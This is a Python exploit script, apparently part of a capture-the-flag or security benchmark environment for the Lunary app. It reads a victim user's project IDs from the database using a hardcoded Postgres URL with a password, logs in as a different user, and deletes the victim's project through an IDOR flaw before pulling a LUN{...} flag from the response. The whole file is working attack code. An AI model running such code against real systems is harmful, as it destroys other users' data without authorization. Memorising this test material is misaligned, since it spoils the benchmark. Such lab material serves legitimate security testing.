import requests
from pathlib import Path
from dotenv import load_dotenv
import os
import psycopg2
import re
import time

# Setup postgres route
DATABASE_URL="postgres://postgres:E19pMTpS6ignd@lunary-postgres:5432/lunary"

# Setup backend route
BACKEND_URL = "http://lunary-app:3333"

def check_db_state():
    if not DATABASE_URL:
        print("ERROR: Missing DATABASE_URL environment variable")
        return
    try:
        conn = psycopg2.connect(DATABASE_URL, connect_timeout=30)
        with conn.cursor() as cur:
            cur.execute("SELECT org_id FROM account WHERE email = 'user_b@exploit.com'")
            org_id = cur.fetchone()[0]
            
            # Get projects for user_a's organization
            cur.execute("SELECT id, name FROM project WHERE org_id = %s ORDER BY created_at", (org_id,))
            projects = cur.fetchall()
            
            print(f"User B's projects:")
            for i, (project_id, project_name) in enumerate(projects, 1):
                print(f"{i}. ID: {project_id}, Name: {project_name}")
            
            return [project[0] for project in projects]
    except psycopg2.Error as e:
        print(f"An error occurred: {e}")
    finally:
        if conn:
            conn.close()


def login_user(email, password, retries=5):
    for _ in range(retries):
        try:
            url = f"{BACKEND_URL}/auth/login"
            payload = {
                "email": email,
                "password": password
            }
            response = requests.post(url, data=payload, timeout=30)
            break
        except requests.exceptions.ConnectionError as e:
            print(f"Connection error: {e}")
            time.sleep(5)
            continue
    return response.json()

def delete_project(token, project_id):
    url = f"{BACKEND_URL}/v1/projects/{project_id}"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.delete(url, headers=headers, timeout=30)
    if response.status_code != 200:
        print(f"Error deleting project: {response.status_code}")
        print(f"Response content: {response.text}")
    return response.status_code, response.text


def exploit():
    print("Getting projects from User B")
    user_b_projects = check_db_state()
    print(user_b_projects)
    print()

    print("Getting auth token for User A")
    user_b_auth = login_user("user_a@exploit.com", "secret_user_a_password")
    print(user_b_auth)
    print()

    project_to_delete = user_b_projects[0]  # type: ignore
    print(f"Project ID targeting deletion: {project_to_delete}")
    delete_status, delete_text = delete_project(user_b_auth["token"], project_to_delete)
    print(f"Delete project status: {delete_status}")
    print(f"Delete project response: {delete_text}")
    print()

    print("After IDOR exploit")
    print(check_db_state())
    
    # Define the regex pattern
    pattern = r"LUN\{[^}]+\}"

    # Search for the pattern in the string
    flag = re.search(pattern, delete_text)
    print(f"{flag.group(0)}")

if __name__ == "__main__":
    print(f"Running on {BACKEND_URL}")
    exploit()
